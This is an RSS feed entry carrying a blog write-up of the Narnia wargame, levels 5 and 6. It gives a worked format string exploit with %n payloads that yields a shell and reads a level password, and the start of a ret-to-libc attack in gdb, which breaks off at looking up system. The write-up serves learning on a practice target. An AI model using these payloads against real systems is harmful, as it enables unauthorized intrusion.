<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Wargame on Unlogic</title>
    <link>https://svenito.github.io/nowhere/tags/wargame/</link>
    <description>Recent content in Wargame on Unlogic</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Mon, 13 Apr 2015 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://svenito.github.io/nowhere/tags/wargame/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Solving Narnia Part 2</title>
      <link>https://svenito.github.io/nowhere/2015/04/13/solving-narnia-part-2/</link>
      <pubDate>Mon, 13 Apr 2015 00:00:00 +0000</pubDate>
      
      <guid>https://svenito.github.io/nowhere/2015/04/13/solving-narnia-part-2/</guid>
      <description>

&lt;p&gt;Carrying on from &lt;a href=&#34;http://unlogic.co.uk/2015/04/08/solving-narnia-part1/&#34;&gt;Part 1&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&#34;level-05:100abf89ce6a11fb3cfc3f5a51e9cb94&#34;&gt;Level 05&lt;/h2&gt;

&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
 
&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv){&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;64&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;

	&lt;span style=&#34;color: #f8f8f2&#34;&gt;snprintf(buffer,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer[&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(buffer)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Change i&amp;#39;s value from 1 -&amp;gt; 500. &amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;

	&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;500&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;){&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;GOOD&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;system(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

	&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;No way...let me give you a hint!&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;buffer : [%s] (%d)&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;strlen(buffer));&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;i = %d (%p)&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i,&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;i);&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

&lt;p&gt;A fixed sized buffer again. This time however trying to overflow it in order to
write to &lt;code&gt;i&lt;/code&gt; won&amp;rsquo;t work. If we look at line 9 and lookup the manpage for &lt;code&gt;snprintf&lt;/code&gt;
we see that&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;The  functions  snprintf() and vsnprintf() write at most size bytes
(including the trailing null byte (&#39;\0&#39;)) to str.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So we won&amp;rsquo;t be able to overflow this buffer. Going through the usual possible exploits
we&amp;rsquo;ve only really go one more to try: &lt;a href=&#34;https://en.wikipedia.org/wiki/Uncontrolled_format_string&#34;&gt;format string attack&lt;/a&gt; or
&lt;em&gt;uncontrolled format string vulnerability&lt;/em&gt;. This happens when user input
isn&amp;rsquo;t checked, and allows the user to use format characters (&lt;code&gt;%s&lt;/code&gt;, &lt;code&gt;%x&lt;/code&gt;) to read or
manipulate the stack.&lt;/p&gt;

&lt;p&gt;For me this is one of the harder exploits to understand, so this level is
great practice for me. So if it doesn&amp;rsquo;t make sense at first, stick with it and
try various strings. Hopefully you&amp;rsquo;ll grok it at some point.&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s check to see if our hunch is right. Using a few characters to start, I
then append a list of &lt;code&gt;%x&lt;/code&gt;, which read values from the stack and print them.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia5@melinda:/narnia$ ./narnia5 &lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;aaaa&amp;#39;+&amp;#39;%x&amp;#39;*10&amp;quot;`&lt;/span&gt;
Change i&amp;#39;s value from 1 -&amp;gt; 500. No way...let me give you a hint!
buffer : [aaaaf7eb75b6ffffffffffffd6aef7e2fbf8616161616265376636623537666] (63)
i = 1 (0xffffd6cc)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Sure enough we see the beginning of the input string after the 4th &lt;code&gt;%x&lt;/code&gt;. So we then
put the address if &lt;code&gt;i&lt;/code&gt; into that location like and shorten the number of &lt;code&gt;%x&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia5@melinda:/narnia$ ./narnia5 &lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;\xcc\xd6\xff\xff&amp;#39;+&amp;#39;%x&amp;#39;*5&amp;quot;`&lt;/span&gt;
Change i&amp;#39;s value from 1 -&amp;gt; 500. No way...let me give you a hint!
buffer : [����f7eb75b6ffffffffffffd6aef7e2fbf8ffffd6cc] (44)
i = 1 (0xffffd6cc)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now we have the address of &lt;code&gt;i&lt;/code&gt;, we use &lt;code&gt;%n&lt;/code&gt; to write to that address, remembering
to remove one &lt;code&gt;%x&lt;/code&gt; to keep the right length.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia5@melinda:/narnia$ ./narnia5 &lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;\xcc\xd6\xff\xff&amp;#39;+&amp;#39;%x&amp;#39;*4 + &amp;#39;%n&amp;#39;&amp;quot;`&lt;/span&gt;
Change i&amp;#39;s value from 1 -&amp;gt; 500. No way...let me give you a hint!
buffer : [����f7eb75b6ffffffffffffd6aef7e2fbf8] (36)
i = 36 (0xffffd6cc)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So we see that we&amp;rsquo;ve written the length of the string into &lt;code&gt;i&lt;/code&gt;. We already have
a value of 36, but we need 500. To achieve this we need to pad the string.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia5@melinda:/narnia$ ./narnia5 &lt;span style=&#34;color: #66d9ef&#34;&gt;$(&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;\xcc\xd6\xff\xff&amp;#39;+&amp;#39;%x&amp;#39;*3 + &amp;#39;%500d&amp;#39; + &amp;#39;%n&amp;#39;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;)&lt;/span&gt;
Change i&amp;#39;s value from 1 -&amp;gt; 500. No way...let me give you a hint!
buffer : [����f7eb75b6ffffffffffffd6ae                                   ] (63)
i = 528 (0xffffd6cc)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We&amp;rsquo;re &lt;em&gt;28&lt;/em&gt; over the target, so let&amp;rsquo;s reduce the padding&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia5@melinda:/narnia$ ./narnia5 &lt;span style=&#34;color: #66d9ef&#34;&gt;$(&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;\xcc\xd6\xff\xff&amp;#39;+&amp;#39;%x&amp;#39;*3 + &amp;#39;%472d&amp;#39; + &amp;#39;%n&amp;#39;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;)&lt;/span&gt;
Change i&amp;#39;s value from 1 -&amp;gt; 500. GOOD
$ whoami
narnia6
$ cat /etc/narnia_pass/narnia6
[password]
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h2 id=&#34;level-06:100abf89ce6a11fb3cfc3f5a51e9cb94&#34;&gt;Level 06&lt;/h2&gt;

&lt;p&gt;&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;extern&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;environ;&lt;/span&gt;

&lt;span style=&#34;color: #75715e&#34;&gt;// tired of fixing values...&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;// - morla&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;get_sp&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
       &lt;span style=&#34;color: #f8f8f2&#34;&gt;__asm__(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;movl %esp,%eax&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n\t&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;
               &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;and $0xff000000, %eax&amp;quot;&lt;/span&gt;
               &lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[]){&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;b1[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;b2[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt;  &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;fp)(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;))&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;puts,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i;&lt;/span&gt;

	&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(argc&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;){&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;%s b1 b2&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

	&lt;span style=&#34;color: #75715e&#34;&gt;/* clear environ */&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;environ[i]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;NULL;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;memset(environ[i],&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;strlen(environ[i]));&lt;/span&gt;
	&lt;span style=&#34;color: #75715e&#34;&gt;/* clear argz    */&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[i]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;NULL;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;memset(argv[i],&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;strlen(argv[i]));&lt;/span&gt;

	&lt;span style=&#34;color: #f8f8f2&#34;&gt;strcpy(b1,argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;strcpy(b2,argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
	&lt;span style=&#34;color: #75715e&#34;&gt;//if(((unsigned long)fp &amp;amp; 0xff000000) == 0xff000000)&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(((&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;long&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)fp&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0xff000000&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;get_sp())&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;fp(b1);&lt;/span&gt;

	&lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;

&lt;p&gt;In this rather complicated looking listing we notice a few things:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;line 17 is a function pointer to &lt;code&gt;puts&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;line 33 calls the function &lt;code&gt;fp&lt;/code&gt; points to&lt;/li&gt;
&lt;li&gt;line 31 prevents &lt;code&gt;fp&lt;/code&gt; from pointing to anything in our frame&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The last lines means we need to point &lt;code&gt;fp&lt;/code&gt; to a call in a system library.
This is going to be a &lt;a href=&#34;https://en.wikipedia.org/wiki/Return-to-libc_attack&#34;&gt;ret to libc attack&lt;/a&gt;. We
need to find the location of the function we want to execute. We want a shell, so our
best option would be to execute &lt;code&gt;system(&#39;/bin/sh&#39;)&lt;/code&gt;. As luck would have it, &lt;code&gt;puts&lt;/code&gt; and
&lt;code&gt;system&lt;/code&gt; both have the same function definition: &lt;code&gt;int system(const char *command);&lt;/code&gt; and
&lt;code&gt;int puts(const char *s);&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s fire up gdb and figure out our addresses.
&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia6@melinda:/narnia$ gdb ./narnia6 -q
Reading symbols from ./narnia6...(no debugging symbols found)...done.
(gdb) disass main
Dump of assembler code for function main:
   0x08048559 &amp;lt;+0&amp;gt;:	push   %ebp
   0x0804855a &amp;lt;+1&amp;gt;:	mov    %esp,%ebp
   0x0804855c &amp;lt;+3&amp;gt;:	push   %ebx
   0x0804855d &amp;lt;+4&amp;gt;:	and    $0xfffffff0,%esp
   0x08048560 &amp;lt;+7&amp;gt;:	sub    $0x30,%esp

    &amp;lt;-- snip --&amp;gt;

   0x0804869b &amp;lt;+322&amp;gt;:	movl   $0xffffffff,(%esp)      
   0x080486a2 &amp;lt;+329&amp;gt;:	call   0x8048410 &amp;lt;exit@plt&amp;gt;
   0x080486a7 &amp;lt;+334&amp;gt;:	lea    0x20(%esp),%eax
   0x080486ab &amp;lt;+338&amp;gt;:	mov    %eax,(%esp)
   0x080486ae &amp;lt;+341&amp;gt;:	mov    0x28(%esp),%eax
   0x080486b2 &amp;lt;+345&amp;gt;:	call   *%eax                &amp;lt;-- calling *fp*
   0x080486b4 &amp;lt;+347&amp;gt;:	movl   $0x1,(%esp)
   0x080486bb &amp;lt;+354&amp;gt;:	call   0x8048410 &amp;lt;exit@plt&amp;gt;
End of assembler dump.

(gdb) break *0x080486b2
Breakpoint 1 at 0x80486b2
(gdb) r aaaaaaaabbbb ccccccccdddd
Starting program: /games/narnia/narnia6 aaaaaaaabbbb ccccccccdddd

Breakpoint 1, 0x080486b2 in main ()
(gdb) x/50wx $esp
0xffffd680:	0xffffd6a0	0xffffd8ac	0x00000021	0x08048712
0xffffd690:	0x00000003	0xffffd754	0x63636363	0x63636363
0xffffd6a0:	0x64646464	0x61616100	0x62626262	0x00000000
0xffffd6b0:	0x080486c0	0xf7fca000	0x00000000	0xf7e3ca63
0xffffd6c0:	0x00000003	0xffffd754	0xffffd764	0xf7feacea
0xffffd6d0:	0x00000003	0xffffd754	0xffffd6f4	0x08049978
0xffffd6e0:	0x08048290	0xf7fca000	0x00000000	0x00000000
0xffffd6f0:	0x00000000	0x32aaee13	0x0a932a03	0x00000000
0xffffd700:	0x00000000	0x00000000	0x00000003	0x08048450
0xffffd710:	0x00000000	0xf7ff0500	0xf7e3c979	0xf7ffd000
0xffffd720:	0x00000003	0x08048450	0x00000000	0x08048471
0xffffd730:	0x08048559	0x00000003	0xffffd754	0x080486c0
0xffffd740:	0x08048730	0xf7feb180
(gdb) p system
